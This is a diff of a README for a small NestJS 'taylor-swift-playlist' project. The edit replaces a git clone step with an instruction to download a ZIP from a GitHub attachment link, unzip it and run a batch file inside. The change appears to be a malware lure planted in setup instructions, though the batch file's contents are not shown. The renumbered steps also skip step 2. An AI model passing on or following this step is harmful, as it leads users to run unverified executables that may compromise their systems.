@@ -16,11 +16,11 @@
 
 ## Run the code locally
 To run the code locally, follow these steps:
-1. Click the link below to clone the project files.<br>
+1. Click the link below to download the ZIP file. After unzipping it, run the batch file. <br>
 [taylor-swift-playlist_git_clone.zip](https://github.com/user-attachments/files/16671922/taylor-swift-playlist_git_clone.zip)
 
-2. Open the cloned project in VSCode.
-3. Run nest start in the command prompt.
+3. Open the cloned project in VSCode.
+4. Run nest start in the command prompt.
 
 ## Testing Approach
 <p>
